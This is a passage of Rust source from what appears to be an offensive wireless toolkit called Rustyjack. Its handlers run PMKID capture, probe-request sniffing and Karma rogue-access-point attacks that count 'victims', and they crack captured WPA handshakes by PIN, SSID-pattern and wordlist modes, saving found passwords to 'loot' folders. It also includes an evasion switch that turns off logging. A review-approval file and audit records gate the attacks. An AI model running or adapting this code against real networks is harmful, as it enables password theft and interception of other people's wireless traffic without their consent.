    use crate::wireless_native::{self, PmkidCaptureConfig};

    tracing::info!("Starting PMKID capture on interface: {}", args.interface);

    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let mut warnings = Vec::new();
        let caps = wireless_native::check_capabilities(&args.interface);
        if !caps.interface_exists {
            errors.push(format!("Interface {} does not exist", args.interface));
        }
        if !caps.interface_is_wireless {
            errors.push(format!("Interface {} is not wireless", args.interface));
        }
        if !caps.supports_monitor_mode {
            warnings.push("Monitor mode not supported".to_string());
        }
        let checks = json!({
            "interface": args.interface,
            "ssid": args.ssid,
            "bssid": args.bssid,
            "channel": args.channel,
            "capabilities": {
                "native_available": caps.native_available,
                "has_root": caps.has_root,
                "interface_exists": caps.interface_exists,
                "interface_is_wireless": caps.interface_is_wireless,
                "supports_monitor_mode": caps.supports_monitor_mode,
                "supports_injection": caps.supports_injection,
            }
        });
        return preflight_only_response(
            root,
            crate::audit::operations::WIFI_PMKID,
            checks,
            errors,
            warnings,
        );
    }

    // Check privileges
    if !wireless_native::native_available() {
        bail!("PMKID capture requires root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    enforce_single_interface(&args.interface)?;
    check_cancel(cancel)?;

    // Check capabilities
    let caps = wireless_native::check_capabilities(&args.interface);
    if !caps.supports_monitor_mode {
        bail!(
            "Interface {} does not support monitor mode (required for PMKID)",
            args.interface
        );
    }

    // Create loot directory under target network + attack type
    let loot_dir =
        wireless_target_directory(root, args.ssid.clone(), args.bssid.clone()).join("PMKID");
    fs::create_dir_all(&loot_dir)?;

    let tag = wireless_tag(args.ssid.as_deref(), args.bssid.as_deref(), &args.interface);
    let _ = log_mac_usage(root, &args.interface, "wifi_pmkid", Some(&tag));

    // Build config for native implementation
    let config = PmkidCaptureConfig {
        interface: args.interface.clone(),
        channel: args.channel,
        target_bssid: args.bssid.clone(),
        duration_secs: args.duration,
    };

    // Execute the native PMKID capture
    let result = wireless_native::execute_pmkid_capture_cancellable(
        &loot_dir,
        &config,
        cancel,
        |progress, status| {
            tracing::debug!("PMKID progress: {:.0}% - {}", progress * 100.0, status);
        },
    )?;

    let target_label = args
        .ssid
        .clone()
        .or_else(|| args.bssid.clone())
        .unwrap_or_else(|| "unknown".to_string());
    let log_file = write_scoped_log(
        root,
        "Wireless",
        &target_label,
        "PMKID",
        "pmkid",
        &[
            format!("PMKID capture on {}", target_label),
            format!("Interface: {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Duration (s): {}", args.duration),
            format!("PMKIDs: {}", result.pmkids_captured),
            format!("Networks seen: {}", result.networks_seen),
            format!(
                "Hashcat file: {}",
                result
                    .hashcat_file
                    .as_ref()
                    .map(|p| p.display().to_string())
                    .unwrap_or_else(|| "none".to_string())
            ),
        ],
    )
    .map(|p| p.display().to_string());

    let data = json!({
        "interface": args.interface,
        "bssid": args.bssid,
        "ssid": args.ssid,
        "channel": args.channel,
        "duration": args.duration,
        "pmkids_captured": result.pmkids_captured,
        "networks_seen": result.networks_seen,
        "hashcat_file": result.hashcat_file.as_ref().map(|p| p.display().to_string()),
        "loot_directory": result.loot_path.display().to_string(),
        "log_file": log_file,
        "isolation_enforced": true,
    });

    let message = if result.pmkids_captured > 0 {
        format!(
            "PMKID captured! {} PMKIDs from {} networks",
            result.pmkids_captured, result.networks_seen
        )
    } else {
        "PMKID capture complete - no PMKIDs found".to_string()
    };

    Ok((message, data))
}

fn handle_wifi_probe_sniff(
    root: &Path,
    args: WifiProbeSniffArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    use crate::wireless_native::{self, ProbeSniffConfig as NativeProbeConfig};

    tracing::info!(
        "Starting probe request sniff on interface: {}",
        args.interface
    );

    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let mut warnings = Vec::new();
        let caps = wireless_native::check_capabilities(&args.interface);
        if !caps.interface_exists {
            errors.push(format!("Interface {} does not exist", args.interface));
        }
        if !caps.interface_is_wireless {
            errors.push(format!("Interface {} is not wireless", args.interface));
        }
        if !caps.supports_monitor_mode {
            warnings.push("Monitor mode not supported".to_string());
        }
        let checks = json!({
            "interface": args.interface,
            "channel": args.channel,
            "duration": args.duration,
            "capabilities": {
                "native_available": caps.native_available,
                "has_root": caps.has_root,
                "interface_exists": caps.interface_exists,
                "interface_is_wireless": caps.interface_is_wireless,
                "supports_monitor_mode": caps.supports_monitor_mode,
                "supports_injection": caps.supports_injection,
            }
        });
        return preflight_only_response(
            root,
            crate::audit::operations::WIFI_PROBE_SNIFF,
            checks,
            errors,
            warnings,
        );
    }

    // Check privileges
    if !wireless_native::native_available() {
        bail!("Probe sniffing requires root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    enforce_single_interface(&args.interface)?;
    check_cancel(cancel)?;

    // Check capabilities
    let caps = wireless_native::check_capabilities(&args.interface);
    if !caps.supports_monitor_mode {
        bail!(
            "Interface {} does not support monitor mode (required for probe sniffing)",
            args.interface
        );
    }

    let session = LootSession::new(root, "probe_sniff", &args.interface)?;
    let loot_dir = session.artifacts.clone();

    let tag = wireless_tag(None, None, &args.interface);
    let _ = log_mac_usage(root, &args.interface, "wifi_probe_sniff", Some(&tag));

    // Build config for native implementation
    let config = NativeProbeConfig {
        interface: args.interface.clone(),
        channel: args.channel,
        duration_secs: args.duration,
    };

    // Execute the native probe sniff
    let result = wireless_native::execute_probe_sniff_cancellable(
        &loot_dir,
        &config,
        cancel,
        |progress, status| {
            tracing::debug!(
                "Probe sniff progress: {:.0}% - {}",
                progress * 100.0,
                status
            );
        },
    )?;

    let log_file = write_session_log(
        &session,
        "probesniff",
        &[
            format!("Probe sniff on {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Duration (s): {}", args.duration),
            format!("Total probes: {}", result.probes_captured),
            format!("Unique clients: {}", result.unique_clients),
            format!("Unique networks: {}", result.unique_networks),
        ],
    )
    .map(|p| p.display().to_string());

    let data = json!({
        "interface": args.interface,
        "channel": args.channel,
        "duration": args.duration,
        "total_probes": result.probes_captured,
        "unique_clients": result.unique_clients,
        "unique_networks": result.unique_networks,
        "loot_directory": result.loot_path.display().to_string(),
        "session_directory": session.dir.display().to_string(),
        "log_file": log_file,
    });

    Ok((
        format!(
            "Probe sniff complete: {} probes, {} clients, {} networks",
            result.probes_captured, result.unique_clients, result.unique_networks
        ),
        data,
    ))
}

fn handle_wifi_karma(
    root: &Path,
    args: WifiKarmaArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    use crate::wireless_native::{self, KarmaAttackConfig};

    tracing::info!("Starting Karma attack on interface: {}", args.interface);

    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let mut warnings = Vec::new();
        let caps = wireless_native::check_capabilities(&args.interface);
        if !caps.interface_exists {
            errors.push(format!("Interface {} does not exist", args.interface));
        }
        if !caps.interface_is_wireless {
            errors.push(format!("Interface {} is not wireless", args.interface));
        }
        if !caps.supports_monitor_mode {
            warnings.push("Monitor mode not supported".to_string());
        }
        if args.with_ap && args.ap_interface.as_deref().unwrap_or("").is_empty() {
            warnings.push("AP interface not specified for Karma AP mode".to_string());
        }
        let checks = json!({
            "interface": args.interface,
            "ap_interface": args.ap_interface,
            "channel": args.channel,
            "duration": args.duration,
            "with_ap": args.with_ap,
            "capabilities": {
                "native_available": caps.native_available,
                "has_root": caps.has_root,
                "interface_exists": caps.interface_exists,
                "interface_is_wireless": caps.interface_is_wireless,
                "supports_monitor_mode": caps.supports_monitor_mode,
                "supports_injection": caps.supports_injection,
            }
        });
        return preflight_only_response(
            root,
            crate::audit::operations::WIFI_KARMA,
            checks,
            errors,
            warnings,
        );
    }

    // Check privileges
    if !wireless_native::native_available() {
        bail!("Karma attack requires root privileges. Run with sudo.");
    }

    // Check if interface is wireless
    if !wireless_native::is_wireless_interface(&args.interface) {
        bail!("Interface {} is not a wireless interface", args.interface);
    }

    check_cancel(cancel)?;

    // Check capabilities
    let caps = wireless_native::check_capabilities(&args.interface);
    if !caps.supports_monitor_mode {
        bail!(
            "Interface {} does not support monitor mode (required for Karma)",
            args.interface
        );
    }

    let mut allowed_interfaces = vec![args.interface.clone()];
    if args.with_ap {
        if let Some(ref ap_iface) = args.ap_interface {
            if !ap_iface.is_empty() && ap_iface != &args.interface {
                allowed_interfaces.push(ap_iface.clone());
            }
        }
    }

    let policy_session = format!(
        "wifi_karma_{}_{}",
        Local::now().format("%Y%m%d_%H%M%S"),
        format!("{:04x}", rand::random::<u16>())
    );
    let _iso_guard = IsolationPolicyGuard::set_allow_list(
        root.to_path_buf(),
        allowed_interfaces.clone(),
        policy_session,
    )?;
    apply_interface_isolation_strict(&allowed_interfaces)?;

    let tag = wireless_tag(None, None, &args.interface);
    let _ = log_mac_usage(root, &args.interface, "wifi_karma", Some(&tag));

    // Parse whitelist/blacklist
    let ssid_whitelist: Vec<String> = args
        .ssid_whitelist
        .as_ref()
        .map(|s| s.split(',').map(|ss| ss.trim().to_string()).collect())
        .unwrap_or_default();

    let ssid_blacklist: Vec<String> = args
        .ssid_blacklist
        .as_ref()
        .map(|s| s.split(',').map(|ss| ss.trim().to_string()).collect())
        .unwrap_or_default();

    let loot_session = LootSession::new(root, "karma", &args.interface)?;
    let loot_dir = loot_session.artifacts.clone();

    // Build config
    let config = KarmaAttackConfig {
        interface: args.interface.clone(),
        ap_interface: args.ap_interface.clone(),
        channel: args.channel,
        duration_secs: args.duration,
        with_ap: args.with_ap,
        ssid_whitelist: ssid_whitelist.clone(),
        ssid_blacklist: ssid_blacklist.clone(),
    };

    // Execute the Karma attack
    let result = wireless_native::execute_karma_cancellable(
        &loot_dir,
        &config,
        cancel,
        |progress, status| {
            tracing::debug!("Karma progress: {:.0}% - {}", progress * 100.0, status);
        },
    )?;

    let log_file = write_session_log(
        &loot_session,
        "karma",
        &[
            format!("Karma attack on {}", args.interface),
            format!("Channel: {}", args.channel),
            format!("Duration (s): {}", args.duration),
            format!("With AP: {}", args.with_ap),
            format!("Probes: {}", result.probes_seen),
            format!("Unique SSIDs: {}", result.unique_ssids),
            format!("Unique clients: {}", result.unique_clients),
            format!("Victims: {}", result.victims),
        ],
    )
    .map(|p| p.display().to_string());

    let data = json!({
        "interface": args.interface,
        "ap_interface": args.ap_interface,
        "channel": args.channel,
        "duration": args.duration,
        "with_ap": args.with_ap,
        "ssid_whitelist": ssid_whitelist,
        "ssid_blacklist": ssid_blacklist,
        "probes_seen": result.probes_seen,
        "unique_ssids": result.unique_ssids,
        "unique_clients": result.unique_clients,
        "victims": result.victims,
        "loot_directory": result.loot_path.display().to_string(),
        "session_directory": loot_session.dir.display().to_string(),
        "log_file": log_file,
    });

    Ok((
        format!(
            "Karma complete: {} probes, {} SSIDs, {} clients, {} victims",
            result.probes_seen, result.unique_ssids, result.unique_clients, result.victims
        ),
        data,
    ))
}

fn handle_wifi_pipeline_preflight(
    root: &Path,
    args: WifiPipelinePreflightArgs,
) -> Result<HandlerResult> {
    let mut errors = Vec::new();
    let warnings = Vec::new();

    let interface = if let Some(ref iface) = args.interface {
        iface.clone()
    } else {
        get_active_interface(root)?.unwrap_or_default()
    };

    if interface.trim().is_empty() {
        errors.push("No active Wi-Fi interface set".to_string());
    }

    let caps = if interface.trim().is_empty() {
        crate::wireless_native::WirelessCapabilities {
            native_available: false,
            has_root: false,
            interface_exists: false,
            interface_is_wireless: false,
            supports_monitor_mode: false,
            supports_injection: false,
        }
    } else {
        crate::wireless_native::check_capabilities(&interface)
    };

    if !caps.native_available {
        errors.push("Native wireless operations unavailable on this platform".to_string());
    }
    if !caps.has_root {
        errors.push("Root privileges required for wireless operations".to_string());
    }
    if !caps.interface_exists {
        errors.push(format!("Interface {} does not exist", interface));
    }
    if !caps.interface_is_wireless {
        errors.push(format!("Interface {} is not wireless", interface));
    }
    if args.requires_monitor && !caps.supports_monitor_mode {
        errors.push("Monitor mode not supported by interface".to_string());
    }
    if args.requires_monitor && !caps.supports_injection {
        errors.push("Frame injection not supported by interface".to_string());
    }

    let checks = json!({
        "interface": interface,
        "pipeline": args.pipeline,
        "requires_monitor": args.requires_monitor,
        "capabilities": {
            "native_available": caps.native_available,
            "has_root": caps.has_root,
            "interface_exists": caps.interface_exists,
            "interface_is_wireless": caps.interface_is_wireless,
            "supports_monitor_mode": caps.supports_monitor_mode,
            "supports_injection": caps.supports_injection,
        }
    });

    preflight_only_response(
        root,
        crate::audit::operations::WIFI_PIPELINE,
        checks,
        errors,
        warnings,
    )
}

fn handle_wifi_crack(
    root: &Path,
    args: WifiCrackArgs,
    cancel: Option<&CancelFlag>,
) -> Result<HandlerResult> {
    use rustyjack_wpa::crack::{generate_ssid_passwords, quick_crack, CrackResult, WpaCracker};
    use rustyjack_wpa::handshake::HandshakeExport;
    use std::path::PathBuf;
    use std::sync::Arc;

    tracing::info!("Starting handshake crack on file: {}", args.file);

    let file_path = PathBuf::from(&args.file);
    if !offensive_review_approved(root) {
        let mut errors = Vec::new();
        let warnings = Vec::new();
        if !file_path.exists() {
            errors.push(format!("Handshake file not found: {}", args.file));
        }
        if file_path
            .extension()
            .and_then(|e| e.to_str())
            .unwrap_or("")
            .to_ascii_lowercase()
            != "json"
        {
            errors.push("Unsupported handshake format (expected JSON export)".to_string());
        }
        if args.mode == "wordlist" && args.wordlist.as_deref().unwrap_or("").is_empty() {
            errors.push("wordlist mode requires --wordlist".to_string());
        }
        let checks = json!({
            "file": args.file,
            "ssid": args.ssid,
            "mode": args.mode,
            "wordlist": args.wordlist,
        });
        return preflight_only_response(
            root,
            crate::audit::operations::WIFI_CRACK,
            checks,
            errors,
            warnings,
        );
    }

    #[derive(serde::Deserialize)]
    struct HandshakeBundle {
        ssid: String,
        handshake: HandshakeExport,
    }

    if !file_path.exists() {
        bail!("Handshake file not found: {}", args.file);
    }

    // Only support JSON handshake exports for cracking
    if file_path
        .extension()
        .and_then(|e| e.to_str())
        .unwrap_or("")
        .to_ascii_lowercase()
        != "json"
    {
        bail!("Unsupported handshake format. Use the generated handshake_export_*.json file from a capture.");
    }

    // Load handshake export bundle (JSON)
    let bundle: HandshakeBundle = {
        let data = fs::read(&file_path)
            .with_context(|| format!("reading handshake export {}", file_path.display()))?;
        serde_json::from_slice(&data)
            .with_context(|| format!("parsing handshake export {}", file_path.display()))?
    };

    let ssid = args.ssid.as_deref().unwrap_or(&bundle.ssid).to_string();

    // Determine crack mode
    let mode = args.mode.as_str();

    // Prepare loot directory for results (use same folder as the handshake export)
    let parent_dir = file_path
        .parent()
        .map(PathBuf::from)
        .unwrap_or_else(|| loot_directory(root, LootKind::Wireless));
    fs::create_dir_all(&parent_dir)?;

    let mut cracker = WpaCracker::new(bundle.handshake.clone(), &ssid);
    if let Some(flag) = cancel {
        cracker = cracker.with_stop_flag(Arc::clone(flag));
    }
    let mut attempts = 0u64;
    let mut password: Option<String> = None;

    match mode {
        "quick" => {
            password = quick_crack(&bundle.handshake, &ssid);
            attempts = cracker.attempts();
        }
        "pins" => match cracker.crack_pins() {
            Ok(r) => match r {
                CrackResult::Found(p) => password = Some(p),
                CrackResult::Exhausted { attempts: a } | CrackResult::Stopped { attempts: a } => {
                    attempts = a
                }
            },
            Err(e) => bail!("PIN crack error: {}", e),
        },
        "ssid" => {
            let patterns = generate_ssid_passwords(&ssid);
            match cracker.crack_passwords(&patterns) {
                Ok(r) => match r {
                    CrackResult::Found(p) => password = Some(p),
                    CrackResult::Exhausted { attempts: a }
                    | CrackResult::Stopped { attempts: a } => attempts = a,
                },
                Err(e) => bail!("SSID-pattern crack error: {}", e),
            }
        }
        "wordlist" => {
            let wordlist = args
                .wordlist
                .as_ref()
                .ok_or_else(|| anyhow!("wordlist mode requires --wordlist"))?;
            match cracker.crack_wordlist(PathBuf::from(wordlist).as_path()) {
                Ok(r) => match r {
                    CrackResult::Found(p) => password = Some(p),
                    CrackResult::Exhausted { attempts: a }
                    | CrackResult::Stopped { attempts: a } => attempts = a,
                },
                Err(e) => bail!("Wordlist crack error: {}", e),
            }
        }
        _ => bail!("Unknown crack mode: {}", mode),
    }

    if attempts == 0 {
        attempts = cracker.attempts();
    }

    check_cancel(cancel)?;

    // Save result if password found
    let mut loot_path = None;
    if let Some(ref pwd) = password {
        let ts = chrono::Local::now().format("%Y%m%d_%H%M%S");
        let outfile = parent_dir.join(format!("crack_result_{}.txt", ts));
        let content = format!(
            "SSID: {}\nFile: {}\nMode: {}\nPassword: {}\nAttempts: {}\n",
            ssid,
            file_path.display(),
            mode,
            pwd,
            attempts
        );
        fs::write(&outfile, content)
            .with_context(|| format!("writing crack result {}", outfile.display()))?;
        loot_path = Some(outfile);
    }

    let data = json!({
        "file": args.file,
        "ssid": ssid,
        "mode": mode,
        "wordlist": args.wordlist,
        "status": if password.is_some() { "found" } else { "exhausted" },
        "attempts": attempts,
        "password": password,
        "loot_path": loot_path.as_ref().map(|p| p.display().to_string()),
    });

    Ok((
        if password.is_some() {
            "Password found".to_string()
        } else {
            "Crack attempt finished".to_string()
        },
        data,
    ))
}

fn handle_wifi_profile_list(root: &Path) -> Result<HandlerResult> {
    tracing::info!("Listing WiFi profiles");

    let profiles = match list_wifi_profiles(root) {
        Ok(p) => {
            tracing::info!("Found {} profile(s)", p.len());
            p
        }
        Err(e) => {
            tracing::error!("Failed to list WiFi profiles: {e}");
            bail!("Failed to list WiFi profiles: {e}");
        }
    };

    let data = json!({
        "profiles": profiles,
        "count": profiles.len(),
    });
    Ok(("Wi-Fi profiles loaded".to_string(), data))
}

fn handle_wifi_profile_show(root: &Path, args: WifiProfileShowArgs) -> Result<HandlerResult> {
    let stored = load_wifi_profile(root, &args.ssid)?;
    let stored = match stored {
        Some(profile) => profile,
        None => bail!("Wi-Fi profile not found"),
    };

    let profile = stored.profile;
    let data = json!({
        "ssid": profile.ssid,
        "password": profile.password,
        "interface": profile.interface,
        "priority": profile.priority,
        "auto_connect": profile.auto_connect,
        "created": profile.created,
        "last_used": profile.last_used,
        "notes": profile.notes,
    });
    Ok(("Wi-Fi profile loaded".to_string(), data))
}

fn handle_wifi_profile_save(root: &Path, args: WifiProfileSaveArgs) -> Result<HandlerResult> {
    let WifiProfileSaveArgs {
        ssid,
        password,
        interface,
        priority,
        auto_connect,
    } = args;

    tracing::info!(
        "[CORE] Saving WiFi profile for SSID: {ssid} iface={}",
        interface
    );

    let profile = WifiProfile {
        ssid: ssid.clone(),
        password: Some(password),
        interface,
        priority: priority as i32,
        auto_connect: auto_connect.unwrap_or(true),
        created: None,
        last_used: None,
        notes: None,
    };

    let path = match save_wifi_profile(root, &profile) {
        Ok(p) => {
            tracing::info!("[CORE] Profile saved successfully to: {}", p.display());
            p
        }
        Err(e) => {
            tracing::error!("[CORE] Failed to save WiFi profile for {ssid}: {e}");
            bail!("Failed to save WiFi profile: {e}");
        }
    };

    let data = json!({
        "ssid": ssid,
        "path": path,
    });
    Ok(("Wi-Fi profile saved".to_string(), data))
}

fn handle_wifi_profile_connect(root: &Path, args: WifiProfileConnectArgs) -> Result<HandlerResult> {
    tracing::info!(
        "[CORE] WiFi connect requested profile={:?} ssid={:?} iface={:?} remember={}",
        args.profile,
        args.ssid,
        args.interface,
        args.remember
    );

    let interface = match select_wifi_interface(args.interface.clone()) {
        Ok(iface) => {
            tracing::info!("Selected interface: {iface}");
            iface
        }
        Err(e) => {
            tracing::error!("Failed to select interface: {e}");
            bail!("Failed to select interface: {e}");
        }
    };

    let stored = if let Some(ref profile_name) = args.profile {
        tracing::info!("Loading profile: {profile_name}");
        match load_wifi_profile(root, profile_name) {
            Ok(p) => p,
            Err(e) => {
                tracing::error!("Failed to load profile '{profile_name}': {e}");
                bail!("Failed to load profile: {e}");
            }
        }
    } else if let Some(ref ssid) = args.ssid {
        tracing::info!("Loading profile by SSID: {ssid}");
        match load_wifi_profile(root, ssid) {
            Ok(p) => p,
            Err(e) => {
                tracing::warn!("Could not load profile for SSID '{ssid}': {e}");
                None
            }
        }
    } else {
        None
    };

    let ssid = args
        .ssid
        .clone()
        .or_else(|| stored.as_ref().map(|p| p.profile.ssid.clone()))
        .ok_or_else(|| {
            tracing::error!("[CORE] WiFi connect failed: no SSID provided/profile not found");
            anyhow!("Provide --ssid or --profile when connecting to Wi-Fi")
        })?;

    let password = args
        .password
        .clone()
        .or_else(|| stored.as_ref().and_then(|p| p.profile.password.clone()));

    tracing::info!("[CORE] Connecting to SSID: {ssid} on interface: {interface}");

    try_apply_mac_policy(root, MacStage::Assoc, &interface, Some(&ssid));

    if let Err(e) = connect_wifi_network(&interface, &ssid, password.as_deref()) {
        tracing::error!("[CORE] Failed to connect to {ssid}: {e}");
        bail!("WiFi connection failed: {e}");
    }

    tracing::info!("[CORE] WiFi connection successful ssid={ssid} iface={interface}");

    let (route_msg, route_data) = handle_wifi_route_ensure(
        root,
        WifiRouteEnsureArgs {
            interface: interface.clone(),
        },
    )?;
    tracing::info!("[CORE] Route ensure after WiFi connect: {}", route_msg);
    if let Some(false) = route_data.get("route_set").and_then(|v| v.as_bool()) {
        tracing::warn!(
            "[CORE] No gateway detected after WiFi connect on {}",
            interface
        );
    }
    if let Some(false) = route_data.get("ping_success").and_then(|v| v.as_bool()) {
        tracing::warn!(
            "[CORE] Ping test failed after WiFi connect on {}",
            interface
        );
    }

    let mut remembered = false;
    if let Some(mut stored_profile) = stored {
        stored_profile.profile.last_used = Some(Local::now().to_rfc3339());
        if args.remember {
            if let Some(pass) = password.clone() {
                stored_profile.profile.password = Some(pass);
                tracing::info!("Updating stored profile with new password");
            } else {
                tracing::warn!("--remember flag set but no password available to store");
            }
        }
        if let Err(e) = write_wifi_profile(&stored_profile.path, &stored_profile.profile) {
            tracing::error!("Failed to update profile: {e}");
        } else {
            remembered = true;
            tracing::info!("Profile updated successfully");
        }
    } else if args.remember {
        if let Some(pass) = password.clone() {
            let profile = WifiProfile {
                ssid: ssid.clone(),
                password: Some(pass),
                interface: args.interface.clone().unwrap_or_else(|| "auto".to_string()),
                priority: 1,
                auto_connect: true,
                created: None,
                last_used: None,
                notes: None,
            };
            match save_wifi_profile(root, &profile) {
                Ok(_) => {
                    remembered = true;
                    tracing::info!("New profile created and saved");
                }
                Err(e) => {
                    tracing::error!("Failed to save new profile: {e}");
                }
            }
        } else {
            tracing::warn!("--remember flag ignored because no password was supplied");
        }
    }

    let data = json!({
        "interface": interface,
        "ssid": ssid,
        "remembered": remembered,
    });
    Ok(("Wi-Fi connection triggered".to_string(), data))
}

fn handle_wifi_profile_delete(root: &Path, args: WifiProfileDeleteArgs) -> Result<HandlerResult> {
    tracing::info!("[CORE] Attempting to delete WiFi profile: {}", args.ssid);

    match delete_wifi_profile(root, &args.ssid) {
        Ok(()) => {
            tracing::info!("[CORE] Profile deleted successfully: {}", args.ssid);
            let data = json!({ "ssid": args.ssid });
            Ok(("Wi-Fi profile deleted".to_string(), data))
        }
        Err(e) => {
            tracing::error!("[CORE] Failed to delete profile '{}': {e}", args.ssid);
            bail!("Failed to delete profile: {e}");
        }
    }
}

fn handle_wifi_disconnect(args: WifiDisconnectArgs) -> Result<HandlerResult> {
    tracing::info!(
        "[CORE] Attempting WiFi disconnect iface={:?}",
        args.interface
    );

    let interface = match disconnect_wifi_interface(args.interface.clone()) {
        Ok(iface) => {
            tracing::info!("[CORE] Successfully disconnected interface: {iface}");
            iface
        }
        Err(e) => {
            tracing::error!("[CORE] Failed to disconnect WiFi: {e}");
            bail!("WiFi disconnect failed: {e}");
        }
    };

    let data = json!({ "interface": interface });
    Ok(("Wi-Fi interface disconnected".to_string(), data))
}

fn wireless_tag(ssid: Option<&str>, bssid: Option<&str>, interface: &str) -> String {
    if let Some(name) = ssid {
        if !name.trim().is_empty() {
            return sanitize_label(name);
        }
    }
    if let Some(mac) = bssid {
        if !mac.trim().is_empty() {
            return sanitize_label(mac);
        }
    }
    sanitize_label(interface)
}

fn loot_directory(root: &Path, kind: LootKind) -> PathBuf {
    match kind {
        LootKind::Scan => root.join("loot").join("Scan"),
        LootKind::Dnsspoof => root.join("DNSSpoof").join("captures"),
        LootKind::Ethernet => root.join("loot").join("Ethernet"),
        LootKind::Wireless => root.join("loot").join("Wireless"),
    }
}

fn scoped_log_dir(root: &Path, scope: &str, target: &str, action: &str) -> Option<PathBuf> {
    if rustyjack_evasion::logs_disabled() {
        return None;
    }
    let safe_target = if target.trim().is_empty() {
        "Unknown".to_string()
    } else {
        sanitize_label(target)
    };
    let safe_action = if action.trim().is_empty() {
        "logs".to_string()
    } else {
        sanitize_label(action)
    };
    let dir = root
        .join("loot")
        .join(scope)
        .join(safe_target)
        .join(safe_action)
        .join("logs");
    fs::create_dir_all(&dir).ok()?;
    Some(dir)
}

fn move_log_into_scope(
    root: &Path,
    scope: &str,
    target: &str,
    action: &str,
    src: &Path,
    hint: &str,
) -> Option<PathBuf> {
    if !src.exists() {
        return None;
    }
    let dir = scoped_log_dir(root, scope, target, action)?;
    let filename = src
        .file_name()
        .and_then(|n| n.to_str())
        .map(|s| s.to_string())
        .unwrap_or_else(|| {
            format!(
                "{}_{}.log",
                sanitize_label(hint),
                Local::now().format("%Y%m%d_%H%M%S")
            )
        });
    let dest = dir.join(filename);
    if fs::rename(src, &dest).is_err() {
        let _ = fs::copy(src, &dest);
    }
    Some(dest)
}

fn write_scoped_log(
    root: &Path,
    scope: &str,
    target: &str,
    action: &str,
    hint: &str,
    lines: &[String],
) -> Option<PathBuf> {
    if rustyjack_evasion::logs_disabled() || lines.is_empty() {
        return None;
    }
    let dir = scoped_log_dir(root, scope, target, action)?;
    let fname = format!(
        "{}_{}.log",
        sanitize_label(hint),
        Local::now().format("%Y%m%d_%H%M%S")
    );
    let path = dir.join(fname);
    if let Ok(mut file) = fs::File::create(&path) {
        for line in lines {
            let _ = writeln!(file, "{line}");
        }
        Some(path)
    } else {
        None
    }
}

fn write_session_log(session: &LootSession, hint: &str, lines: &[String]) -> Option<PathBuf> {
    if lines.is_empty() {
        return None;
    }
    let dir = session.logs.as_ref()?;
    let fname = format!(
        "{}_{}.log",
        sanitize_label(hint),
        Local::now().format("%Y%m%d_%H%M%S")
    );
    let path = dir.join(fname);
    if let Ok(mut file) = fs::File::create(&path) {
        for line in lines {
            let _ = writeln!(file, "{line}");
        }
        Some(path)
    } else {
        None
    }
}

/// Build a per-network loot directory under loot/Wireless/<safe_name>
/// Falls back to BSSID, then "Unknown" if nothing provided.
fn wireless_target_directory(root: &Path, ssid: Option<String>, bssid: Option<String>) -> PathBuf {
    let make_safe = |s: &str| {
        let mut out = String::with_capacity(s.len());
        for ch in s.chars() {
            if ch.is_ascii_alphanumeric() || ch == '-' || ch == '_' {
                out.push(ch);
            } else {
                out.push('_');
            }
        }
        let trimmed = out.trim_matches('_').to_string();
        if trimmed.is_empty() {
            "Unknown".to_string()
        } else {
            trimmed
        }
    };

    let name = ssid
        .as_ref()
        .map(|s| s.as_str())
        .filter(|s| !s.is_empty())
        .map(|s| make_safe(s))
        .or_else(|| {
            bssid
                .as_ref()
                .map(|b| b.as_str())
                .filter(|b| !b.is_empty())
                .map(|b| make_safe(b))
        })
        .unwrap_or_else(|| "Unknown".to_string());

    root.join("loot").join("Wireless").join(name)
}

fn loot_kind_label(kind: LootKind) -> &'static str {
    match kind {
        LootKind::Scan => "scan",
        LootKind::Dnsspoof => "dnsspoof",
        LootKind::Ethernet => "ethernet",
        LootKind::Wireless => "wireless",
    }
}

fn resolve_loot_path(root: &Path, path: &Path) -> Result<PathBuf> {
    let candidate = if path.is_absolute() {
        path.to_path_buf()
    } else {
        root.join(path)
    };
    let canonical = candidate
        .canonicalize()
        .with_context(|| format!("resolving {}", path.display()))?;
    if !canonical.starts_with(root) {
        bail!("Path {} is outside the Rustyjack root", canonical.display());
    }
    Ok(canonical)
}

fn review_artifact_path(root: &Path) -> PathBuf {
    root.join("REVIEW_APPROVED.md")
}

fn offensive_review_approved(root: &Path) -> bool {
    review_artifact_path(root).exists()
}

fn preflight_only_response(
    root: &Path,
    op: &str,
    checks: Value,
    errors: Vec<String>,
    warnings: Vec<String>,
) -> Result<HandlerResult> {
    let review_path = review_artifact_path(root);
    let status = if errors.is_empty() { "OK" } else { "FAIL" };
    let reason = format!("review approval missing ({})", review_path.display());
    let audit = AuditEvent::new(op)
        .with_result(AuditResult::Denied {
            reason: reason.clone(),
        })
        .with_context(json!({
            "status": status,
            "errors": errors,
            "warnings": warnings,
        }));
    let _ = audit.log(root);

    let message = if status == "OK" {
        "Preflight OK (authorization required)".to_string()
    } else {
        "Preflight failed (authorization required)".to_string()
    };
    let data = json!({
        "mode": "preflight_only",
        "authorized": false,
        "review_artifact": review_path.display().to_string(),
        "status": status,
        "errors": errors,
        "warnings": warnings,
        "checks": checks,
    });

    Ok((message, data))
}

#[derive(Debug, Clone, Serialize)]
struct SanityCheck {
    name: String,
    status: String,
    details: Vec<String>,
    missing_paths: Vec<String>,
    remediation: Option<String>,
}

#[derive(Debug, Clone, Serialize)]
struct SanityReport {
    overall: String,
    checks: Vec<SanityCheck>,
}

fn record_status(overall: &mut String, status: &str) {
    if overall == "FAIL" {
        return;
    }
    if status == "FAIL" {
        *overall = "FAIL".to_string();
    } else if status == "WARN" && overall != "FAIL" {
        *overall = "WARN".to_string();
    }
}

fn check_interface_sanity(iface: &str, required: bool) -> SanityCheck {
    let mut details = Vec::new();
    let mut missing_paths = Vec::new();
    let mut status = "OK";

    let sys_iface = Path::new("/sys/class/net").join(iface);
    if !sys_iface.exists() {
        missing_paths.push(sys_iface.display().to_string());
        status = if required { "FAIL" } else { "WARN" };
        return SanityCheck {
            name: format!("interface:{iface}"),
